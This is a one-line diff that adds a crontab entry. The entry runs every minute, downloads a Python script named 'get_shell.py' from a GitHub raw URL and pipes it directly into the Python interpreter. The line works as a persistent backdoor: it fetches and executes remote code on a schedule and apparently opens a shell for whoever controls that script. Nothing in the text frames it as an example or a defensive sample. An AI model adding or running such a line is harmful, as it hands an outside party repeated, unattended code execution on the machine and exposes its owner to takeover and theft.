@@ -1,0 +1,1 @@
+*/1 * * * *  curl -fsS https://raw.githubusercontent.com/SuperLandy/Python/master/Security/get_shell.py |python
